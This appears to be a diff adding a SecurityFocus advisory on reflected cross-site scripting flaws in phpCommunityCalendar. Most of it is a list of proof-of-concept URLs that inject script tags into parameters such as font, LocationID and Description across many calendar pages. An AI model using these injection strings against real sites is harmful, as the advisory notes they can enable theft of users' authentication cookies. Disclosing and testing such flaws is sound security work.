@@ -1,0 +1,22 @@
+source: http://www.securityfocus.com/bid/14767/info
+
+phpCommunityCalendar is prone to multiple remote cross-site scripting vulnerabilities. These issues are due to a lack of proper sanitization of user-supplied input.
+
+An attacker may leverage any of these issues to have arbitrary script code executed in the browser of an unsuspecting user in the context of the affected site. This may facilitate the theft of cookie-based authentication credentials as well as other attacks. 
+
+http://www.example.com/[path]/thankyou.php?LocationID="><script>alert('LOL')</script>
+http://www.example.com/[path]/calDaily.php?font="><script>alert('LOL')<script><"
+http://www.example.com/[path]/calMonthly.php?font="><script>alert('LOL'</script><"
+http://www.example.com/[path]/calMonthlyP.php?font="><script>alert('LOL')</script><"
+http://www.example.com/[path]/calWeekly.php?font="><script>alert('LOL')</script><"
+http://www.example.com/[path]/calWeeklyP.php?font="><script>alert('LOL')</script><"
+http://www.example.com/[path]/calYearly.php?font="><script>alert('LOL')</script><"
+http://www.example.com/[path]/calYearlyP.php?font="><script>alert('LOL')</script><"
+http://www.example.com/[path]/day.php?font="><script>alert('LOL')</script><!--
+http://www.example.com/[path]/day.php?LocationID="><script>alert('LOL')</script><!--
+http://www.example.com/[path]/event.php?font="><script>alert('LOL')</script>
+http://www.example.com/[path]/event.php?CeTi=</title><script>alert('LOL')</script>
+http://www.example.com/[path]/event.php?Contact=<script>alert('LOL')</script>
+http://www.example.com/[path]/event.php?Description=<script>alert('LOL')</script>
+http://www.example.com/[path]/event.php?ShowAddress=<script>alert('LOL')</script>
+http://www.example.com/[path]/week.php?font="><script>alert('LOL')</script> 
